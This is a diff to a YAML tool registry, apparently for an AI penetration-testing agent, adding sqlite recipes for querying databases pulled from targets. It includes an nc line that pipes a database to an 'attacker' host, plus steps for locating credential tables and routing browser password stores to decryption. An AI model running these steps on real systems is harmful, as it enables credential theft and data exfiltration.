-        description: Get complete database schema including all tables, their columns (name, type, constraints), row counts,
-          and original CREATE TABLE SQL statements. Provides a comprehensive overview of the entire database structure in
-          one call.
-        when_to_use: When you want the full picture of a database in a single call rather than running list_tables followed
-          by describe_table on each. Returns more detail than list_tables (includes column definitions and CREATE SQL) but
-          can produce large output for databases with many tables. Prefer list_tables for initial quick look, use schema when
-          you need the complete structure.
-        params:
-          database:
-            type: string
-            required: true
-            description: Path to SQLite database file, or base64-encoded content (set is_base64=true)
-          is_base64:
-            type: boolean
-            default: false
-            description: Set to true when database parameter contains base64-encoded file content
-        returns:
-          tables:
-            type: object
-            description: 'Dictionary keyed by table name, each with: ''columns'' (array of {name, type, notnull, pk}), ''row_count''
-              (integer), ''create_sql'' (original CREATE TABLE statement)'
-          table_count:
-            type: integer
-            description: Total number of tables in the database
+      - wp_users
+      - places.sqlite
+      - cookies.sqlite
+      - Login Data
+      prefer_over: []
+    see_also:
+    - tool: ssh
+      reason: Use `ssh` (kind:cli v3.0) ControlMaster + scp pattern to download the target's .sqlite/.db file to /session/output/sqlite/
+        before running sqlite3 against it. scp through an established ControlMaster reuses the auth + adds zero per-call overhead.
+    - tool: nc
+      reason: When ssh isn't available, use `nc` v2.0 held-listener pipeline to receive the .sqlite/.db file (e.g., target
+        runs `cat /path/db.sqlite | base64 | nc attacker 4444`; agent's nc listener writes to /session/output/nc-recv/db.sqlite.b64;
+        then Pattern S0 base64-decodes + queries).
+    - tool: mongodb
+      reason: For ONLINE NoSQL DB targets use the `mongodb` (kind:mcp vendor MCP). sqlite is strictly for OFFLINE .sqlite/.db
+        file extraction post-engagement.
+    - tool: exploit-runner
+      reason: When sqlite3 CLI is insufficient (complex multi-statement migrations, custom Python extraction with sqlite3
+        stdlib for browser-specific binary password decoding like Firefox signons.sqlite NSS), drop into `exploit-runner`
+        with a Write-staged Python script that uses sqlite3 + the relevant decryption library (e.g., pyasn1 for NSS, cryptography
+        for Chrome v10/v11 key).
+    - tool: hash-lookup
+      reason: After find_credentials extracts password hashes (MD5 in WordPress phpass, bcrypt $2a$, $P$ phpass), feed to
+        `hash-lookup` to check public pre-cracked databases (hashes.com, NIST) before spending CPU on hashcat.
+    target_extraction: []
+    reject_flags: []
+    reject_flags_reason: sqlite3 takes a local DB path + SQL; there's no remote-target argument shape. The DB-path positional
+      arg looks superficially like a target but it's a local filesystem path, not a network endpoint. No reject_flags apply.
+    usage_patterns:
+    - name: Pattern S0 — base64-encoded DB → file → query (downloaded-from-target flow)
+      binary: bash
+      command: -c 'mkdir -p /session/output/sqlite && echo "<B64_STRING>" | base64 -d > /session/output/sqlite/<name>.db &&
+        sqlite3 -json /session/output/sqlite/<name>.db "<SQL>"'
+      when: 'Use when target''s .sqlite/.db file was exfiltrated as a base64 blob (via held shell `cat db.sqlite | base64`,
+        ssh.exec output, HTTP form upload, etc.). Two-step recipe: (1) Write tool puts base64 string into /session/output/sqlite/<name>.b64,
+        OR agent inlines it in `echo`; (2) base64 -d writes the binary DB then sqlite3 queries it. Round-trip is byte-identical
+        (verified 2026-05-17). For DBs already on disk (scp''d via ssh ControlMaster), skip this pattern and call sqlite3
+        directly on the path.'
+    - name: Pattern S1 — list_tables (first probe of any new DB)
+      binary: sqlite3
+      command: -json -readonly /session/output/sqlite/<db> "SELECT name FROM sqlite_master WHERE type='table' AND name NOT
+        LIKE 'sqlite_%' ORDER BY name;"
+      when: 'Always the first sqlite3 call on a newly-discovered .db/.sqlite file. Returns a JSON array of user-defined table
+        names; filter `name NOT LIKE ''sqlite_%''` hides internal SQLite metadata (sqlite_master, sqlite_sequence, sqlite_stat1).
+        `-readonly` flag prevents accidental writes to the engagement artifact (critical for forensic-style analysis where
+        the DB might be re-examined later). Output shape: `[{"name":"users"},{"name":"wp_users"},...]`.'
+    - name: Pattern S2 — describe_table (column schema for a specific table)
+      binary: sqlite3
+      command: -json -readonly /session/output/sqlite/<db> "PRAGMA table_info('<table>');"
+      when: 'After Pattern S1 identifies an interesting table (e.g., ''users'', ''wp_users'', ''api_keys''), use this to inspect
+        columns BEFORE selecting data. Returns each column''s cid (position), name, type, notnull flag, default value, and
+        pk flag. Output shape: `[{"cid":0,"name":"id","type":"INTEGER","notnull":0,"dflt_value":null,"pk":1},...]`. Use this
+        output to identify credential columns (password/hash/token/secret) and to know which columns are BLOB type (require
+        quote() wrapper — see gotcha).'
+    - name: Pattern S3 — dump_table (extract rows with optional column filter)
+      binary: sqlite3
+      command: -json -readonly /session/output/sqlite/<db> "SELECT <cols-or-asterisk> FROM \"<table>\" LIMIT <N>;"
+      when: Extract data from a specific table. Always include `LIMIT N` — kind:cli does NOT auto-inject limits like the legacy
+        wrapper did. Recommend `LIMIT 10` for initial sampling of large tables, `LIMIT 100-1000` for full extraction of credential
+        tables. Use double-quoted column names if any have special chars or reserved keywords (`SELECT "user-name", "select"
+        FROM "weird-table"`). For BLOB columns wrap with `quote(col)` to get lossless hex literals — see gotcha BLOB COLUMNS
+        LOSSY.
+    - name: Pattern S4 — query (arbitrary SQL — JOINs, aggregates, custom WHERE)
+      binary: sqlite3
+      command: -json -readonly /session/output/sqlite/<db> "<arbitrary SQL>"
+      when: 'Catch-all for queries not covered by S1-S3: JOINs across tables (`SELECT u.username, s.session_id FROM users
+        u JOIN sessions s ON s.user_id=u.id`), aggregates (`SELECT role, COUNT(*) FROM users GROUP BY role`), LIKE/GLOB searches
+        (`SELECT * FROM users WHERE email LIKE ''%@admin.%''`), or PRAGMAs not in S2 (`PRAGMA journal_mode;` to check WAL
+        — see WAL gotcha).'
+    - name: Pattern S5 — full schema (CREATE TABLE statements for all tables)
+      binary: sqlite3
+      command: -json -readonly /session/output/sqlite/<db> "SELECT name, sql FROM sqlite_master WHERE type='table' AND name
+        NOT LIKE 'sqlite_%' ORDER BY name;"
+      when: 'When you want full schema context in ONE call (vs. S1 + N×S2). Returns each table''s CREATE TABLE statement verbatim.
+        Larger output than S1 but reveals: column types + defaults inline, foreign-key references (`REFERENCES users(id)`),
+        indices, CHECK constraints, generated columns. Use this for unfamiliar DBs where the schema reveals app structure.
+        For just CREATE statements without JSON wrapper, omit -json and run with `.schema` instead: `sqlite3 -readonly /session/output/sqlite/<db>
+        ''.schema''` returns multi-line SQL ready for re-execution against a fresh DB.'
+    - name: 'Pattern S6 — find_credentials step 1: candidate tables (replaces legacy heuristic)'
+      binary: sqlite3
+      command: -json -readonly /session/output/sqlite/<db> "SELECT name FROM sqlite_master WHERE type='table' AND name NOT
+        LIKE 'sqlite_%' AND (LOWER(name) LIKE '%user%' OR LOWER(name) LIKE '%account%' OR LOWER(name) LIKE '%admin%' OR LOWER(name)
+        LIKE '%member%' OR LOWER(name) LIKE '%auth%' OR LOWER(name) LIKE '%cred%' OR LOWER(name) LIKE '%login%' OR LOWER(name)
+        LIKE '%api%' OR LOWER(name) LIKE '%key%' OR LOWER(name) LIKE '%session%' OR LOWER(name) LIKE '%customer%' OR LOWER(name)
+        LIKE '%employee%');"
+      when: Step 1 of replacing the legacy Python `find_credentials` heuristic (14 table + 11 username + 11 password pattern
+        arrays). Returns table names matching common credential-related keywords. Then chain into Pattern S2 (describe_table)
+        per candidate to see columns, grep for credential column patterns (user|login|email|pass|pwd|hash|token|secret|key|cred)
+        — LLM does this trivially from JSON output — then Pattern S3 (dump_table) with just the credential columns. Verified
+        live 2026-05-17 against synthetic DB with users + wp_users + api_keys — extracted plaintext + bcrypt + phpass + API
+        tokens correctly via S6 → S2 → S3 chain. For unusual schemas (Firefox `moz_logins.encryptedUsername/encryptedPassword`,
+        mobile-app obfuscated names like 'tbl_secrets_v2'), the agent reads S1 (full list_tables) + S2 output and emits a
+        TARGETED S3 query directly — LLM does pattern matching from schema text. This pattern is the common-case shortcut;
+        agent-driven query chain is the fallback.
+    output_formats:
+    - flag: -json
+      format: json
+      preferred: true
+      notes: JSON array of row-objects. Default for all parsing recipes. Requires sqlite ≥3.33 (image has 3.46). Empty result
+        set returns empty stdout (NOT '[]') — agent's parser must handle. NULL values become JSON null. BLOB bytes are UTF-8-escaped
+        (lossy) — use quote(col) for hex literal.
+    - flag: -csv
+      format: csv
+      preferred: false
+      notes: Comma-separated with optional header (-header / -noheader). Use when piping into other CSV tools (`xsv`, spreadsheet
+        imports) or when JSON would balloon output (very wide rows).
+    - flag: -line
+      format: text
+      preferred: false
+      notes: Human-readable `name = value` lines per cell. Useful for one-row PRAGMA outputs (`PRAGMA database_list`) when
+        the JSON would be over-structured for the reader.
+    - flag: ''
+      format: text
+      preferred: false
+      notes: 'Default mode: pipe-separated rows, no header. Compact but fragile (any | in data corrupts parsing). Avoid for
+        credential extraction; use -json instead.'
+    common_options:
+      output_modes:
+      - '-json: JSON array of objects (preferred for parsing)'
+      - '-csv: CSV with optional header (-header turns on column names)'
+      - '-line: name=value pairs, one per line'
+      - '-column: fixed-width column output (human-readable)'
+      - '-table: ASCII table output (markdown-like, readable)'
+      - '-markdown: GitHub-flavored markdown table'
+      - '-insert: SQL INSERT statements (full SQL backup)'
+      - '-list: pipe-separated, no header (default)'
+      controls:
+      - '-readonly: open DB read-only (recommended for forensic safety on engagement artifacts)'
+      - '-batch: force batch mode (no interactive prompts even if stdin is a TTY)'
+      - '-bail: stop on first error instead of continuing'
+      - '-header / -noheader: turn column headers on/off (default depends on mode)'
+      - '-nullvalue TEXT: distinguish NULL from empty string in output (e.g., -nullvalue NULL)'
+      - '-separator SEP: custom column separator (default ''|'' for list mode)'
+      - '-init FILE: read+execute FILE before reading stdin (setup script)'
+      - '-cmd ''COMMAND'': run ''COMMAND'' before reading stdin (useful for `.timeout 5000` for locked DBs)'
+      dot_commands:
+      - '.tables [pattern]: list tables (filterable by GLOB pattern)'
+      - '.schema [table]: show CREATE TABLE for table (or all tables if omitted)'
+      - '.indices [table]: list indices on table'
+      - '.databases: list attached database files'
+      - '.dump [table]: full SQL dump (CREATE + INSERT statements)'
+      - '.read FILE: execute SQL script from file'
+      - '.recover: reconstruct readable data from a corrupted DB (sqlite ≥3.40)'
+      - '.timeout MS: wait up to MS milliseconds for a locked DB'
+      - '.help: list all dot-commands (run interactively)'
+    gotchas:
+    - 'JSON OUTPUT FOR PARSING: always use `-json` for SELECT/PRAGMA recipes — default pipe-separated mode is fragile (any
+      `|` in data corrupts parsing) + quoting is messy. JSON requires sqlite ≥3.33; image has 3.46. Empty result set returns
+      EMPTY stdout (not `[]`), so the parser must handle empty as `0 rows`, NOT as an error.'
+    - 'BLOB COLUMNS LOSSY IN -json: when a column type is BLOB (visible via PRAGMA table_info), `-json` UTF-8-escapes the
+      bytes which silently corrupts non-UTF-8 binary data (password hashes stored as BLOB, image data, encrypted secrets).
+      Wrap with `quote(col)` to get lossless `X''89504E47...''` hex literal output: `SELECT username, quote(password_blob)
+      AS pw_hex FROM users`. Verified 2026-05-17 on synthetic DB with PNG-header BLOB column.'
+    - 'EMPTY TABLES RETURN EMPTY STDOUT in -json mode: `sqlite3 -json db "SELECT * FROM empty_audit_log"` returns NOTHING
+      (zero bytes). Agent''s parser must interpret empty stdout as `0 rows` not as parse error. Same with WHERE clauses that
+      match zero rows.'
+    - 'SPECIAL CHAR / RESERVED KEYWORD COLUMN+TABLE NAMES: SQLite identifiers with hyphens, dots, or SQL keywords (`select`,
+      `order`, `group`, `from`) must be DOUBLE-quoted in SQL: `SELECT "user-name", "select" FROM "weird-table"`. JSON output
+      keys carry the quoted name verbatim — no client-side issue. Single quotes are for string literals, NOT identifiers —
+      mixing them up produces ''no such column'' errors.'
+    - 'NO AUTO-LIMIT (legacy wrapper had it): the kind:mcp wrapper auto-appended `LIMIT 1000` to SELECTs without one. kind:cli
+      does NOT — agent MUST include `LIMIT N` explicitly or risk dumping huge tables into context. Recommend LIMIT 10 for
+      initial probe (especially on tables with >10k rows seen in describe_table row_count), LIMIT 100-1000 for credential-table
+      full extractions.'
+    - 'DOWNLOADED-FROM-TARGET DB (base64 path, Pattern S0): the legacy `is_base64=true` parameter is replaced by a 2-step
+      recipe — Write tool stages the base64 string into /session/output/sqlite/<name>.b64 (or agent inlines), then `base64
+      -d` writes the binary file, then sqlite3 queries it. Byte-identical round-trip verified 2026-05-17 against 45KB synthetic
+      DB. For DBs already on disk via scp through ssh ControlMaster, skip the base64 step entirely.'
+    - 'WAL MODE SIDECARS (Firefox / Chrome / mobile apps): SQLite databases in WAL journal mode have `-wal` and `-shm` companion
+      files containing uncommitted recent writes. Many real targets (Firefox `places.sqlite`, Chrome `Login Data`, Android/iOS
+      app DBs) ship in WAL mode. If you download ONLY the main `.db` from target, you LOSE the most recent writes. Always
+      check first: `sqlite3 -readonly db.sqlite "PRAGMA journal_mode;"` — if `wal`, also download `db.sqlite-wal` and `db.sqlite-shm`
+      and place all three in the same directory; sqlite3 auto-loads sidecars on open.'
+    - 'FIND_CREDENTIALS HEURISTIC MOVED FROM WRAPPER TO RECIPE+AGENT: legacy Python wrapper had hardcoded 14 table + 11 username
+      + 11 password regex arrays. Pattern S6 ports the common case as a bash recipe (sqlite3 + awk + grep). For novel schemas
+      where the table/column names don''t match common patterns (Firefox `moz_logins.encryptedUsername/encryptedPassword`,
+      mobile-app obfuscated names like `tbl_creds_v2`, custom-app `accounts_internal.pw_hash_v3`), the agent reads `list_tables`
+      + `describe_table` output and emits a TARGETED query — LLMs trivially recognize ''encryptedPassword'' as a credential
+      column without a regex array.'
+    - 'INTERNAL sqlite_* TABLES (sqlite_master, sqlite_sequence, sqlite_stat1): every SQLite DB has metadata tables prefixed
+      `sqlite_`. Filter via `name NOT LIKE ''sqlite_%''` in list_tables / schema recipes. In sqlite ≥3.33, `sqlite_master`
+      is also aliased as `sqlite_schema` (more accurate name); both refer to the same table — either works.'
+    - '.recover FOR DAMAGED DATABASES: if `sqlite3 db.sqlite ".tables"` fails with `Error: file is not a database` or `Error:
+      database disk image is malformed`, try `sqlite3 db.sqlite ''.recover'' > /session/output/sqlite/recovered.sql` followed
+      by `sqlite3 /session/output/sqlite/new.db < /session/output/sqlite/recovered.sql` to reconstruct what''s salvageable.
+      `.recover` produces a SQL script (CREATE + INSERT statements) for everything it can extract from page-by-page scan.
+      Output is verbose; pipe through grep if you only need specific tables.'
+    - 'READ-ONLY ACCESS RECOMMENDED for engagement artifacts: append `-readonly` to all S1-S5 recipes (already done in the
+      default recipes above). Prevents accidental writes (e.g., a `DELETE` typo or a forgotten test-INSERT) to a downloaded
+      DB that may be re-examined later or referenced in the report. Trivially small flag, large safety win.'
+    - 'CONNECTION TIMEOUT for LOCKED DBs: if you''re operating on a target''s live DB through a sibling spawn (rare — most
+      engagement flow is download-then-analyze offline) and the app is actively writing, `sqlite3 db "SELECT..."` may fail
+      with `Error: database is locked`. Use `-cmd ''.timeout 5000''` to wait up to 5s for the lock. Or copy the file out:
+      `cp db db.copy && sqlite3 db.copy ...` (sqlite locks live on the inode, not the path-copy).'
+    - 'DOT-COMMANDS vs SQL SYNTAX: SQL statements (`SELECT`, `PRAGMA`, `INSERT`) are passed as the second arg to sqlite3 directly.
+      Dot-commands (`.tables`, `.schema`, `.dump`, `.recover`) also work as the second arg, OR via `-cmd ''.tables''` before
+      the SQL stdin. Mixing them in one string is finicky — prefer separate calls or use `-cmd` for setup + SQL for the actual
+      query.'
+    - 'BROWSER-SPECIFIC DECRYPTION OUT OF SCOPE for raw sqlite3: Firefox `signons.sqlite` / `logins.json` stores credentials
+      encrypted with NSS (Network Security Services); the DB content is base64-encoded ciphertext, NOT cleartext. sqlite3
+      only extracts the encrypted blob. To decrypt, route to `exploit-runner` with a Python script using `pyasn1 + python-nss`
+      (or browser-cookies-decrypt utilities). Same for Chrome `Login Data` (DPAPI on Windows / Keychain on macOS / Secret
+      Service on Linux for v10+ encrypted_value blobs).'
+    failure_signatures:
+    - signal: 'Error: file is not a database'
+      layer: format
+      remediation: 'The file isn''t a recognizable SQLite DB. Identify what it is: (1) `file /session/output/sqlite/<db>`
+        — if ''SQLite 3.x'' but still failing, the header is fine but pages corrupted → try `.recover`: `sqlite3 db ''.recover''
+        > recovered.sql; sqlite3 new.db < recovered.sql`. (2) If `file` reports ''data'' (no magic) and `xxd db | head -1`
+        shows bytes 0-15 as random (not the literal string ''SQLite format 3\\0''), it''s an ENCRYPTED SQLCipher database
+        — sqlite3 CLI cannot read it without the key. Either (a) use the `sqlcipher` binary if installed elsewhere (not in
+        this image), or (b) route to exploit-runner with a Python script using pysqlcipher3 + the recovered key; (c) if you
+        have a memory dump of the app process, grep for the SQLCipher key. (3) For partial downloads, re-check via `wc -c`
+        against target''s `ls -la` of the source file. (4) Journal/WAL sidecars (`-journal`, `-wal`, `-shm`) are NOT standalone
+        databases — they require the main `.db` file to be useful.'
+    - signal: 'Error: no such table:'
+      layer: sql
+      remediation: Table name typo or case mismatch. Run Pattern S1 (list_tables) to see exact names. SQLite identifiers are
+        case-sensitive when quoted; bare identifiers are case-insensitive but reserved keywords need quoting. Use `"TableName"`
+        (double quotes) for case-preserving + special-char-tolerant access.
+    - signal: 'Error: no such column:'
+      layer: sql
+      remediation: 'Column name typo, case mismatch, or unquoted identifier where one is needed. Run Pattern S2 (describe_table)
+        to see exact column names. Quote special-char columns: `"col-name"`, `"select"`. Don''t use single quotes — those
+        are for string literals and produce confusing ''no such column'' errors when applied to identifiers.'
+    - signal: 'Error: near'
+      layer: sql
+      remediation: 'SQL syntax error. Most common: unescaped single quotes in string literals (use `''''` to escape: `WHERE
+        name = ''O''''Brien''`); missing comma between SELECT columns; trailing semicolon in unsupported context; mixing -cmd
+        dot-command + SQL in one string. Inspect the offending token shown after ''near'' and check quoting + escaping.'
+    - signal: 'Error: database is locked'
+      layer: lock
+      remediation: 'Another process holds an exclusive lock (rare on offline engagement DBs; can happen if you''re querying
+        a target''s live DB through a sibling spawn). Two fixes: (1) wait — add `-cmd ''.timeout 5000''` to wait up to 5s;
+        (2) bypass — copy the file (`cp db db.copy && sqlite3 -readonly db.copy ...`); SQLite locks live on inode + path,
+        copy gets a fresh inode.'
+    - signal: 'Error: unable to open database file'
+      layer: io
+      remediation: 'Path doesn''t exist, not readable, or directory missing. Verify with `ls -la /session/output/sqlite/`.
+        For Pattern S0 (base64 path): confirm `base64 -d` ran without error before sqlite3 — bad base64 produces a 0-byte
+        file or partial garbage. Check permissions: DB file needs read perm; if WAL mode, the directory also needs write perm
+        for the -shm/-wal sidecars (use `-readonly` to bypass this requirement).'
+    help_commands:
+    - name: sqlite3 — top-level CLI help
+      binary: sqlite3
+      command: --help
+      when: Print sqlite3's command-line flag list (output modes, controls, special options). target=null.
+    - name: sqlite3 — interactive dot-command reference
+      binary: sqlite3
+      command: ':memory: ''.help'''
+      when: 'Print all dot-commands (.tables, .schema, .dump, .recover, .read, .mode, etc.) with one-line descriptions. Uses
+        :memory: (in-RAM throwaway DB) so no file needed. target=null.'
+    - name: sqlite3 — show all PRAGMAs
+      binary: sqlite3
+      command: ':memory: ''PRAGMA pragma_list;'''
+      when: List all PRAGMA names available in this sqlite build. Useful for finding non-obvious introspection PRAGMAs (foreign_key_list,
+        index_list, integrity_check, etc.). target=null.
   sqlmap:
     name: sqlmap
     kind: cli
@@ -21583,6 +21179,12 @@ tools:
     - tool: nmap
       reason: Run nmap -p 22 -sV before SSH to confirm the port is open AND running OpenSSH (vs Dropbear, libssh, custom).
         Some legacy services on port 22 reject standard OpenSSH KEX algorithms — nmap's banner reveals which.
+    - tool: sqlite
+      reason: 'After scp-downloading a target''s `.db` / `.sqlite` file via ControlMaster (Firefox places.sqlite, Chrome Login
+        Data, mobile-app DBs, WordPress sqlite-backed installs, custom-app session/config stores), use `sqlite` (kind:cli
+        v3.46, May 2026 Tier A flip) to query the local copy: Pattern S1 list_tables → S2 describe_table → S3 dump_table or
+        S6 find-credentials-candidates. The sqlite tool migrated kind:mcp → kind:cli May 2026; raw sqlite3 -json output replaces
+        the legacy Python wrapper.'
     target_extraction:
     - rule: positional_match
       pattern: ^([^@\s]+@)?([^:/?#\s]+)
@@ -24719,9 +24321,9 @@ tools:
     - tool: forensics
       reason: Use forensics for file-level analysis (binwalk extraction, steghide, exiftool metadata) on artifacts extracted
         from memory (dumped processes, files from filescan).
-    - tool: ghidra
+    - tool: exploit-runner
       reason: After identifying suspicious processes in memory (windows.malfind.Malfind), dump the executable with windows.dumpfiles.DumpFiles
-        and use ghidra for reverse engineering.
+        and use exploit-runner with objdump/strings/radare2 for reverse engineering.
     target_extraction: []
     reject_flags: []
     reject_flags_reason: Volatility 3 has no network target and no target-list flag. The operands are a local dump file path
@@ -24814,7 +24416,8 @@ tools:
       when: Detect injected code via VAD analysis. windows.malfind.Malfind looks for memory regions that are RWX (read/write/execute)
         AND backed by no file (anonymous private mapping) — the classic shellcode-injection signature. Use `--pid N` to scope
         to a single process; omit for an all-process scan (slower, more output). Pair with windows.vadinfo.VadInfo for raw
-        VAD walking and windows.dumpfiles.DumpFiles to extract suspicious regions for offline yara/ghidra analysis.
+        VAD walking and windows.dumpfiles.DumpFiles to extract suspicious regions for offline yara analysis or radare2 via
+        exploit-runner.
     - name: MFT extraction with output directory
       command: vol -f /session/output/dump.raw windows.mftscan.MFTScan -o /session/output/mft/ --cache-path /session/output/vol-cache
       when: Extract NTFS Master File Table entries from memory. windows.mftscan.MFTScan recovers file metadata (filenames,
